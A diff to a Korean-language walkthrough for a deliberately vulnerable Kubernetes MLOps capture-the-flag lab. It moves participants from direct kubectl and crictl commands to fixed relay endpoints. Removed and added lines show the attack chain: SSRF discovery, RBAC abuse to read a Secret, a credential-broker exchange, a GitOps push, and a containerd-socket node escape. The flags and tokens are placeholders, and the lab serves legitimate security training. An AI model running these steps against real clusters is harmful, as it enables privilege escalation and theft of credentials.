@@ -72,6 +72,46 @@ Stage 1 marker PoC를 로컬에서 실행할 때는 프로젝트가 검증한 Py
 외부에서 접근 가능한 ModelGate API를 통해 외부에 노출되지 않은
 `lab-canary.stage-01-canary.svc.cluster.local:9000`에 도달한다.
 
+### 내부 주소 발견
+
+첫 화면은 API 기반 서비스라는 점과 공개 API schema 링크만 제공한다. 참가자는 브라우저의
+`API documentation` 링크 또는 다음 표준 FastAPI 경로에서 공격 표면을 조사한다.
+
+```bash
+curl -fsS "$MODELGATE_URL/openapi.json" |
+  python -m json.tool
+```
+
+명세에서 `GET /api/system/info`를 발견한 뒤 조회한다.
+
+```bash
+curl -fsS "$MODELGATE_URL/api/system/info" |
+  python -m json.tool
+```
+
+```json
+{
+  "service": "modelgate",
+  "environment": "kubernetes-lab",
+  "legacy_webhook_probe": {
+    "service": "lab-canary",
+    "namespace": "stage-01-canary",
+    "port": 9000,
+    "path": "/canary"
+  }
+}
+```
+
+Kubernetes의 namespace 간 Service DNS 형식
+`<service>.<namespace>.svc.cluster.local`을 적용하면 다음 내부 목적지를 얻는다.
+
+```text
+http://lab-canary.stage-01-canary.svc.cluster.local:9000/canary
+```
+
+system-info는 이 좌표만 제공하며 완성 URL, ClusterIP, AWS metadata 또는 credential은
+노출하지 않는다.
+
 ### 핵심
 
 Webhook URL 검증은 최초 URL을 기준으로 이루어지지만, 실제 test 요청은 HTTP redirect를
@@ -237,7 +277,9 @@ python poc/rce_marker.py --timeout 120
   "artifact_uri": "models:/m-<model-id>",
   "validation_job": "<uuid>",
   "validation_status": "succeeded",
-  "evidence": "validator marker observed"
+  "evidence": "validator marker observed",
+  "foothold_session": "<same-proof-uuid>",
+  "next": "/api/lab/footholds/<proof-uuid>/self-rules"
 }
 ```
 
@@ -252,16 +294,17 @@ HTTP/1.1 404 Not Found
 ### Output identity
 
 - `uid=10001`의 validator process execution
-- `system:serviceaccount:modelgate-lab:modelgate` ServiceAccount가 연결된 Pod 문맥
-
-현재 자동 acceptance는 운영자 impersonation으로 이후 identity를 재현하지만, 문제의 논리적
-연결은 validator foothold에서 해당 ServiceAccount 권한을 조사하는 것이다.
+- `system:serviceaccount:modelgate-lab:modelgate` ServiceAccount 권한으로 동작하는
+  proof-bound foothold relay
+- relay는 SelfSubjectRulesReview와 Stage 2의 고정 Job 생성·상태·로그만 제공한다.
 
 ### Shortcut이 아닌 이유
 
 - validator는 non-root, capability drop, read-only root filesystem을 유지한다.
 - privileged, hostPath, host namespace, runtime socket, AWS identity가 없다.
 - proof API는 marker 내용이나 임의 경로를 입력받지 않는다.
+- foothold relay는 Kubernetes token, 임의 API path, manifest, namespace, Pod 이름을
+  참가자에게 노출하지 않는다.
 - MLflow Service는 외부에 직접 노출되지 않는다.
 
 ### 배운 점
@@ -295,46 +338,30 @@ modelgate: jobs.create
 
 ### 실제 요청
 
-먼저 effective permission을 확인한다.
+Stage 1 응답의 `foothold_session`을 사용해 effective permission을 확인한다.
 
 ```bash
-MODELGATE_USER='system:serviceaccount:modelgate-lab:modelgate'
-
-kubectl auth can-i create jobs.batch \
-  --as="$MODELGATE_USER" \
-  -n stage-02-rbac
-# yes
-
-kubectl auth can-i get secret/stage-02-flag \
-  --as="$MODELGATE_USER" \
-  -n stage-02-rbac
-# no
+FOOTHOLD="${MODELGATE_URL}/api/lab/footholds/<proof-uuid>"
+curl -fsS "${FOOTHOLD}/self-rules" | python -m json.tool
 ```
 
-고정된 attack Job을 `modelgate` identity로 생성한다.
+응답의 `resource_rules`에서 `stage-02-rbac`의 `jobs.create`를 찾는다. 이어서 caller가
+manifest를 보낼 수 없는 고정 endpoint로 reviewed Job을 생성하고 상태를 polling한다.
 
 ```bash
-kubectl apply \
-  --as="$MODELGATE_USER" \
-  -f lab/stages/stage-02-rbac/attack-job.yaml
+curl -fsS -X POST "${FOOTHOLD}/stage-02/job" | python -m json.tool
 
-kubectl -n stage-02-rbac wait \
-  --for=condition=complete \
-  job/stage-02-secret-reader \
-  --timeout=5m
+curl -fsS "${FOOTHOLD}/stage-02/job" | python -m json.tool
+# succeeded가 1이 될 때까지 polling
 ```
 
-Job Pod의 로그를 읽고 Kubernetes Secret의 base64 값을 decode한다.
+고정 Job의 synthetic 로그를 읽고 Kubernetes Secret의 base64 값을 decode한다.
+완료된 Job은 참가자 세션의 Stage 3 선행 증거로 사용되므로 자동 TTL 삭제하지 않고 lab
+reset에서 명시적으로 제거한다.
 
 ```bash
-POD="$(kubectl -n stage-02-rbac get pod \
-  --as="$MODELGATE_USER" \
-  -l job-name=stage-02-secret-reader \
-  -o jsonpath='{.items[0].metadata.name}')"
-
-kubectl -n stage-02-rbac logs \
-  --as="$MODELGATE_USER" "$POD"
-# RkxBR3tzdGFnZV8yX3JiYWNfY2hhaW5pbmdfcGxhY2Vob2xkZXJ9
+curl -fsS "${FOOTHOLD}/stage-02/log" | python -m json.tool
+# encoded_proof: RkxBR3tzdGFnZV8yX3JiYWNfY2hhaW5pbmdfcGxhY2Vob2xkZXJ9
 ```
 
 ### 중요한 응답
@@ -390,56 +417,41 @@ reference를 알아낸 후 broker에 요청해 Stage 3 Flag와 제한된 Git cre
 
 ### 실제 요청
 
-`monitoring-runner` identity를 사용하는 임시 client Pod를 생성한다.
+Stage 2 log 응답의 `next`를 따라 `monitoring-runner` identity의 제한된 세션에서
+Grafana datasource를 열거한다.
 
 ```bash
-kubectl apply -f lab/stages/stage-03-monitoring/attack-client.yaml
-
-kubectl -n stage-02-rbac wait \
-  --for=condition=Ready \
-  pod/stage-03-client \
-  --timeout=3m
+curl -fsS "${FOOTHOLD}/stage-03/datasources" | python -m json.tool
 ```
 
-Grafana datasource proxy를 통해 Prometheus query를 보낸다.
+응답에서 `stage3-prometheus` UID를 확인한 뒤, 고정 Grafana datasource proxy query를
+실행한다. 참가자는 query 문자열이나 내부 URL을 지정하지 않는다.
 
 ```bash
-kubectl exec -n stage-02-rbac stage-03-client -- \
-  curl -fsS \
-  'http://grafana.stage-03-monitoring.svc:3000/api/datasources/proxy/uid/stage3-prometheus/api/v1/query?query=gitops_debug_info'
+curl -fsS "${FOOTHOLD}/stage-03/query" | python -m json.tool
 ```
 
 ### 중요한 topology 응답
 
 ```json
 {
-  "status": "success",
-  "data": {
-    "resultType": "vector",
-    "result": [
-      {
-        "metric": {
-          "application": "runtime-builder",
-          "branch": "stage4-lab",
-          "broker": "http://credential-broker.stage-03-monitoring.svc:8080",
-          "credential_ref": "stage3-lab-repo-writer",
-          "destination": "stage-04-gitops",
-          "path": "runtime-builder/",
-          "repository": "lab-git.internal/vuln-mlops-gitops"
-        },
-        "value": ["<timestamp>", "1"]
-      }
-    ]
-  }
+  "application": "runtime-builder",
+  "branch": "stage4-lab",
+  "broker": "http://credential-broker.stage-03-monitoring.svc:8080",
+  "credential_ref": "stage3-lab-repo-writer",
+  "destination": "stage-04-gitops",
+  "path": "runtime-builder/",
+  "repository": "lab-git.internal/vuln-mlops-gitops",
+  "next": "/api/lab/footholds/<proof-uuid>/stage-03/exchange/stage3-lab-repo-writer"
 }
 ```
 
 발견한 reference로 broker에 요청한다.
 
 ```bash
-kubectl exec -n stage-02-rbac stage-03-client -- \
-  curl -fsS \
-  'http://credential-broker.stage-03-monitoring.svc:8080/exchange/stage3-lab-repo-writer'
+curl -fsS \
+  "${FOOTHOLD}/stage-03/exchange/stage3-lab-repo-writer" |
+  python -m json.tool
 ```
 
 ### 중요한 credential 응답
@@ -453,7 +465,9 @@ kubectl exec -n stage-02-rbac stage-03-client -- \
   "branch": "stage4-lab",
   "path": "runtime-builder/",
   "application": "runtime-builder",
-  "destination": "stage-04-gitops"
+  "destination": "stage-04-gitops",
+  "git_gateway": "/api/lab/footholds/<proof-uuid>/stage-04/git/vuln-mlops-gitops.git",
+  "application_status": "/api/lab/footholds/<proof-uuid>/stage-04/application"
 }
 ```
 
@@ -466,16 +480,13 @@ curl /exchange/arbitrary-reference
 # HTTP 404
 ```
 
-Stage 3 client가 Prometheus Service에 직접 요청하면 NetworkPolicy에서 막힌다.
-
-```bash
-curl --connect-timeout 5 --max-time 8 \
-  'http://prometheus.stage-03-monitoring.svc:9090/api/v1/query?query=gitops_debug_info'
-# curl: (28) Connection timed out
-```
+ModelGate는 `monitoring-session` Service만 연결할 수 있으며 Grafana, Prometheus,
+credential broker에는 직접 연결할 수 없다. 세션 relay도 Prometheus 직접 경로를 제공하지
+않고 datasource 목록, 고정 query, 정확한 exchange reference 이외 경로는 404로 거부한다.
 
 또한 `monitoring-runner`에는 Secret list, workload 생성, pods/exec, node 또는 node/proxy
-권한이 없다. Prometheus/Grafana/broker Service는 모두 `ClusterIP`이며 Ingress가 없다.
+권한이 없고 relay에는 ServiceAccount token도 mount되지 않는다. Prometheus/Grafana/broker
+Service는 모두 `ClusterIP`이며 Ingress가 없다.
 
 ### 배운 점
 
@@ -510,14 +521,19 @@ Stage 4 성공 증거와 Stage 5 socket-ready desired state를 한 manifest에 �
 
 ### 실제 요청
 
-Gitea Service에 임시 port-forward를 연 뒤 Stage 3 credential로 clone한다.
+Stage 3 응답의 `git_gateway`는 처음부터 사용한 ModelGate EIP 아래의 상대 경로다.
+참가자는 내부 Gitea 주소나 Kubernetes 접근 권한 없이 이 고정 gateway로 clone한다.
 
 ```bash
-kubectl port-forward -n stage-04-gitops service/gitea 33000:3000
+MODELGATE=http://<modelgate-eip>
+PROOF_ID=<stage-1-rce-proof-uuid>
+GIT_USER=stage3-lab-writer
+GIT_TOKEN=SYNTHETIC_STAGE3_GIT_TOKEN
+GIT_GATEWAY="/api/lab/footholds/${PROOF_ID}/stage-04/git/vuln-mlops-gitops.git"
 
 git clone \
   --branch stage4-lab \
-  http://stage3-lab-writer:SYNTHETIC_STAGE3_GIT_TOKEN@127.0.0.1:33000/stage3-lab-writer/vuln-mlops-gitops.git
+  "http://${GIT_USER}:${GIT_TOKEN}@<modelgate-eip>${GIT_GATEWAY}"
 ```
 
 `runtime-builder/deployment.yaml`을 다음 reviewed manifest로 교체한다.
@@ -537,31 +553,30 @@ Git push의 중요한 응답은 branch update다.
 <old-sha>..<new-sha>  HEAD -> stage4-lab
 ```
 
-Argo Application의 revision과 상태를 확인한다.
+Argo Application의 revision과 상태도 같은 proof 세션으로 확인한다.
 
 ```bash
-kubectl -n stage-04-gitops get application runtime-builder \
-  -o custom-columns='NAME:.metadata.name,SYNC:.status.sync.status,HEALTH:.status.health.status,REVISION:.status.sync.revision'
+curl -fsS \
+  "${MODELGATE}/api/lab/footholds/${PROOF_ID}/stage-04/application" |
+  python -m json.tool
 ```
 
 ### 중요한 응답
 
-```text
-NAME              SYNC     HEALTH    REVISION
-runtime-builder   Synced   Healthy   <new-git-commit-sha>
+```json
+{
+  "name": "runtime-builder",
+  "namespace": "stage-05-runtime",
+  "sync": "Synced",
+  "health": "Healthy",
+  "revision": "<new-git-commit-sha>",
+  "stage4_proof": "FLAG{stage_4_gitops_placeholder}",
+  "stage5_mode": "runtime-socket"
+}
 ```
 
-reconcile된 Deployment에서 Stage 4 proof와 Stage 5 mode를 확인한다.
-
-```bash
-kubectl -n stage-05-runtime get deployment runtime-builder \
-  -o jsonpath='proof={.spec.template.metadata.annotations.lab\.vuln-mlops/stage-04-proof}{"\n"}stage5={.spec.template.spec.containers[0].env[?(@.name=="STAGE5_MODE")].value}{"\n"}'
-```
-
-```text
-proof=FLAG{stage_4_gitops_placeholder}
-stage5=runtime-socket
-```
+`revision`은 push 결과의 새 SHA와 같아야 하며 `stage4_proof`와 `stage5_mode`가 다음
+runtime 경계가 준비됐음을 보여준다.
 
 Audit log에는 다음 경계가 보여야 한다.
 
@@ -577,6 +592,8 @@ system:serviceaccount:stage-04-gitops:argocd-application-controller
 - 다른 Deployment update: RBAC `Forbidden`
 - Deployment 생성/삭제, Secret·ServiceAccount·Role·RoleBinding 생성: 거부
 - privileged, hostPath 등 허용 shape 밖의 변경: admission 거부
+- 다른 repository 또는 Gitea UI/API 경로: ModelGate route 404
+- Basic credential 누락, 임의 Git service, 8 MiB 초과 request: gateway 거부
 
 ### 배운 점
 
@@ -608,42 +625,23 @@ socket 제어는 사실상 해당 노드의 높은 권한이다. 그래서 workl
 
 ### 실제 요청
 
-socket과 runtime을 확인한다.
+Stage 4 application 응답의 `runtime_relay` 값을 확인한다.
+
+```json
+{
+  "runtime_relay": "/api/lab/footholds/<proof-uuid>/stage-05/runtime/proof"
+}
+```
+
+처음부터 사용한 ModelGate endpoint에 body 없는 POST를 보낸다.
 
 ```bash
-POD="$(kubectl -n stage-05-runtime get pod \
-  -l app=runtime-builder \
-  -o jsonpath='{.items[0].metadata.name}')"
-
-kubectl exec -n stage-05-runtime "$POD" -- \
-  test -S /run/stage5/containerd.sock
-
-kubectl exec -n stage-05-runtime "$POD" -- \
-  crictl \
-    --runtime-endpoint=unix:///run/stage5/containerd.sock \
-    --image-endpoint=unix:///run/stage5/containerd.sock \
-    version
+curl -fsS -X POST \
+  "${MODELGATE}/api/lab/footholds/${PROOF_ID}/stage-05/runtime/proof" |
+  python -m json.tool
 ```
 
-중요한 응답은 실제 EKS node의 containerd CRI다.
-
-```text
-RuntimeName:        containerd
-RuntimeVersion:     2.2.7+unknown
-RuntimeApiVersion:  v1
-```
-
-현재 Pod sandbox를 찾는다.
-
-```bash
-kubectl exec -n stage-05-runtime "$POD" -- \
-  crictl --runtime-endpoint=unix:///run/stage5/containerd.sock \
-    pods --name "$POD" --quiet
-
-# <sandbox-id>
-```
-
-자동 acceptance는 다음과 같은 제한된 container config를 만든다.
+내부 relay는 참가자 입력 없이 다음 고정 container config만 생성한다.
 
 ```text
 image: 현재 digest-pinned runtime-client image
@@ -653,37 +651,21 @@ mount 2: 현재 Pod의 emptyDir -> /out
 privileged: false
 ```
 
-이 config를 현재 sandbox에 연결해 짧은 CRI container를 생성하고 시작한다.
-
-```bash
-kubectl exec -n stage-05-runtime "$POD" -- \
-  crictl --runtime-endpoint=unix:///run/stage5/containerd.sock \
-    create <sandbox-id> /tmp/stage5-container.json /tmp/stage5-pod.json
-# <container-id>
-
-kubectl exec -n stage-05-runtime "$POD" -- \
-  crictl --runtime-endpoint=unix:///run/stage5/containerd.sock \
-    start <container-id>
-```
-
 ### 중요한 응답
 
-CRI container가 host의 고정 proof를 현재 Pod의 `emptyDir`에 복사한다.
-
-```bash
-kubectl exec -n stage-05-runtime "$POD" -- \
-  cat /tmp/stage5-proof
-
-# FLAG{stage_5_node_placeholder}
+```json
+{
+  "proof": "runtime",
+  "success": true,
+  "evidence": "synthetic escape-node proof observed",
+  "flag": "FLAG{stage_5_node_placeholder}"
+}
 ```
 
-증거 수집 후 임시 CRI container를 삭제한다.
-
-```bash
-kubectl exec -n stage-05-runtime "$POD" -- \
-  crictl --runtime-endpoint=unix:///run/stage5/containerd.sock \
-    rm <container-id>
-```
+응답 전 relay가 임시 CRI container와 Pod 내부 proof 파일을 제거한다. 참가자에게
+Kubernetes credential, `kubectl exec`, sandbox ID 또는 임의 `crictl` 인자는 제공되지 않는다.
+baseline의 relay는 HTTP 409를 반환하며 Stage 4 desired state가 proof annotation과 mode를
+함께 reconcile해야 admission이 `RELAY_ENABLED=true` 전환을 허용한다.
 
 ### 주요 shortcut denial
 
@@ -693,6 +675,9 @@ kubectl exec -n stage-05-runtime "$POD" -- \
 - privileged, hostNetwork, ServiceAccount token 활성화: 거부
 - Argo controller의 새 Deployment/Pod/Job/Secret/RBAC 생성: RBAC 거부
 - escape node에는 다른 Stage의 일반 workload와 실제 credential을 배치하지 않는다.
+- request body, command, image, path, Pod 또는 sandbox 지정: API/relay 거부
+- Stage 4가 `Synced/Healthy`가 아니거나 proof/mode가 없으면 relay 호출 전 HTTP 409
+- runtime relay는 ClusterIP이며 ModelGate Pod 이외 ingress를 허용하지 않는다.
 
 ### 배운 점
 
@@ -733,7 +718,7 @@ PASS: Stage 1-5 intended path and representative shortcut denials completed.
 
 | Stage | 핵심 요청 | 중요한 응답/증거 |
 | --- | --- | --- |
-| 1A | `POST /api/webhooks`, `POST /api/webhooks/<id>/test` | `MODELGATE_INTERNAL_SSRF_PROOF` |
+| 1A | OpenAPI → `GET /api/system/info` → webhook create/test | canary 좌표와 `MODELGATE_INTERNAL_SSRF_PROOF` |
 | 1B | artifact upload → model register → job polling → proof GET | `validation_status=succeeded`, `validator marker observed` |
 | 2 | `modelgate`로 고정 Job 생성, Job log 조회 | base64 decode된 `FLAG{stage_2_rbac_chaining_placeholder}` |
 | 3 | Grafana datasource proxy query, broker exchange | repository/branch/path reference와 synthetic Git token |
